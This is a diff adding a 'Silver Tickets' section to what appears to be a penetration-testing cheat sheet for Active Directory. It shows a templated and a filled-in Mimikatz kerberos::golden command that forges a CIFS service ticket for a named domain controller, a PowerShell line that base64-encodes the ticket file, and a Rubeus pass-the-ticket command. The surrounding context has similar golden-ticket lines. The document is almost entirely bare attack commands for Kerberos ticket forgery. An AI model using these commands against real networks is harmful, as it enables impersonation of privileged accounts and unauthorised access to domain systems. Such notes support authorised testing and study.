@@ -20,3 +20,10 @@ kerberos::golden /user:Administrator /domain:insomnia.io /sid:S-1-5-21-386582369
 
 Rubeus ptt /ticket:[...snip...]
 ```
+### Silver Tickets
+```
+kerberos::golden /user:<> /domain:<> /sid:<> /target:<> /service:<> /rc4:<> /ticket:silver.kirbi
+ kerberos::golden /user:Administrator /domain:insomnia.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc-1.insomnia.io /service:cifs /rc4:REDACTED /ticket:silver.kirbi
+ [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\silver.kirbi"))
+ Rubeus ptt /ticket:[...snip...]
+```
